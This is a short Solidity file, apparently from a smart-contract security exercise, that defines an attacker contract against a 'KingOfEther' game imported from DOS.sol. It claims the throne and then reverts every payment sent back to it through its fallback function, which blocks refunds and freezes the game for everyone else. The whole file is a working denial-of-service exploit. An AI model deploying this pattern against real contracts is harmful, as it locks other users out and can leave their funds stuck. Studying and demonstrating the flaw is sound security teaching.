// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./DOS.sol";

contract MaliciousContract {
    KingOfEther public kingOfEtherContract;
    bool locked;

    modifier nonReentrancy() {
        require(!locked, "No reentrancy");
        locked = true;
        _;
        locked = false;
    }

    constructor(address _kingOfEther) {
        kingOfEtherContract = KingOfEther(_kingOfEther);
    }

    // Fallback function that will revert all payments
    fallback() external payable {
        revert("Fallback function reverts all payments");
    }

    function claimThrone() external payable nonReentrancy {
        kingOfEtherContract.claimThrone{value: msg.value}();
    }
}